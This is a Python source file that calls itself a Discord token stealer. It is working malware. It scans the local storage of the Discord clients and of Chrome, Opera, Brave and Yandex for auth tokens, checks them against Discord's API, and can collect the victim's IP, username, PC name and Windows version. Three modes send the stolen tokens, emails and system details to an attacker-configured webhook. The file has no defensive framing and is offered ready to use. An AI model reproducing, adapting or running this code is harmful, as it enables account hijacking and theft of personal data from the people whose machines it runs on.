"""
A discord token stealer
Made by MegaDev
"""
import os
import re
import json
import random
import platform as osinfo

# CONFIGURATION:
# your webhook URL
WEBHOOK_URL = 'WEBHOOK HERE'

# determines what information you wanna send
# none of this works in raw
SEND_IP = False
SEND_PC_INFO = False
# mentions you when you get a hit
PING_ME = False


'''
CHANGELOG:
- Cleaning up code
- minified version
'''

# CODE


# checking for non builtin libraries
try:
    import requests
except Exception:
    print("some libraries could not be found")
    raise
# if system is not Windows. quit
# code only compatibile with windows!
if not osinfo.system() == 'Windows':
    raise OSError

def find_tokens(path):
    """
    find token in .log , .ldb files using regex
    """
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}',errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def get_user_info(token):
    """Gets UserInfo from the Discord API

    Args:
        token (str): discord auth token

    Returns:
        dict: UserInfo dict from the discord api
    """
    # https://discord.com/developers/docs/resources/user#get-current-user
    return json.loads(requests.get(
        'https://discord.com/api/v9/users/@me',
        headers={"Authorization": token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
        )
        .text)

def get_ip():
    """Gets the IP of victims machine

    Returns:
        str: the IP
    """
    url = "https://api.ipify.org/"
    response = requests.get(url)
    return response.text

def get_pc_info():
    """Gets information about the victims PC

    Returns:
        dict[username,pcname,windowsver]
    """
    userinfo = dict(
        user=os.getlogin(),
        pc_name=osinfo.uname().node,
        windows_ver='Windows ' + osinfo.release() + ' ' + osinfo.win32_edition() + ' ' + osinfo.version(),
    )
    return userinfo

def get_premium_type(user_data):
    """Returns PremiumType in a human readable way

    Args:
        user_data (dict): raw user data json

    Returns:
        str: PremiumType in a human readable way
    """
    # https://discord.com/developers/docs/resources/user#user-object-premium-types
    try:
        if user_data['premium_type'] == 0:
            nitro = 'None'
        elif user_data['premium_type'] == 1:
            nitro = 'Nitro Classic ($5)'
        elif user_data['premium_type'] == 2:
            nitro = 'Nitro ($10)'
    except KeyError:
        nitro = 'None'
    # 'premium_type' not always present?
    # just return None if its not there

    return nitro


local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

paths = {
    'Discord': roaming + '\\Discord',
    'Discord Canary': roaming + '\\discordcanary',
    'Discord PTB': roaming + '\\discordptb',
    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
    'Opera': roaming + '\\Opera Software\\Opera Stable',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
}

headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
IP = None
PC_INFO = None
if SEND_IP:
    IP = get_ip()
if SEND_PC_INFO:
    PC_INFO = get_pc_info()

def simple():
    """
    sends a message in text mode
    simple but effective
    """
    message = '@everyone\n' if PING_ME else ''

    message += '**IP**\n``' + IP + '``\n' if IP else ''
    message += '**PC_INFO**\n' + f"Username: ``{PC_INFO['user']}``\nPC NAME: ``{PC_INFO['pc_name']}``\nWindows Version: ``{PC_INFO['windows_ver']}``" if PC_INFO else ''
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                try:
                    message += f'{get_user_info(token)["username"]}#{get_user_info(token)["discriminator"]}\n'
                    message += f'{token}\n\n'
                except Exception:
                    pass
        else:
            message += 'No tokens found.\n'

        message += '```'


    payload = json.dumps({'username':'Token Grabber by Mega145','content': message})

    try:
        requests.post(WEBHOOK_URL, data=payload.encode(), headers=headers)
    except Exception:
        pass
def fancy():
    """
    Sends it all with embeds
    A fancy way of sending data
    """
    embeds = []
    if SEND_PC_INFO:
        PC_INFO = get_pc_info()
        color = random.randint(0, 0xFFFFFF)
        embed = {"title":'PC_INFO','description':f'``{PC_INFO["windows_ver"]}``',
        "color":color,"fields":[
        {
            "name":'**PC_IDENTITY**',
            "value":f"Username: ``{PC_INFO['user']}``\nPC NAME: ``{PC_INFO['pc_name']}``"
        }
        ]}
        embeds.append(embed)
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        tokens = find_tokens(path)
        # if there are tokens
        # check them all
        if len(tokens) > 0:
            for token in tokens:
                try:
                    raw_user = get_user_info(token)
                    #print(raw_user)
                except Exception:
                    # if this token doesn not work it changed
                    # just iterate again
                    continue
                    #print('This token does not work')
                try:
                    # setting up embeds
                    color = random.randint(0, 0xFFFFFF)
                    nitro = get_premium_type(raw_user)
                    username = f'{raw_user["username"]}#{raw_user["discriminator"]}'
                    embed = {"title":username,'description':f'Token:\n```{token}```',"color":color,"fields":[
                        {
                            "name":f'**Discord Account Info from {platform}**',
                            "value":f"NAME: ``{username}``\nEMAIL: ``{raw_user['email']}``\nNitro: ``{nitro}``\n"
                        }
                    ],'author':{
                        'name':username,'icon_url':'https://cdn.discordapp.com/avatars/' + str(raw_user['id']) + '/' + str(raw_user['avatar'])
                    }}
                    embeds.append(embed)
                except Exception:
                    pass
                    #print(f'could not make an embed\n{e}')

    ping = '@everyone\n' if PING_ME else '\n'
    internet_protocol_address = get_ip() if SEND_IP else ''
    message = {"username":"Token Grabber by MegaDev",'content':'You got a hit. ' + ping + 'IP: ``' + internet_protocol_address + '``',"embeds":embeds}
    payload = json.dumps(message)

    #print(message)
    requests.post(WEBHOOK_URL,headers=headers,data=payload.encode())
    #print(response.text)
def raw():
    """
    Just sends a POST request with the token\n
    Easy data collection
    """
    for platform,path in paths.items():
        if not os.path.exists(path):
            continue

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                try:
                    get_user_info(token)
                    requests.post(WEBHOOK_URL,data=token.encode())
                except Exception:
                    continue
                    #print('This token does not work')
                #print(response.text)
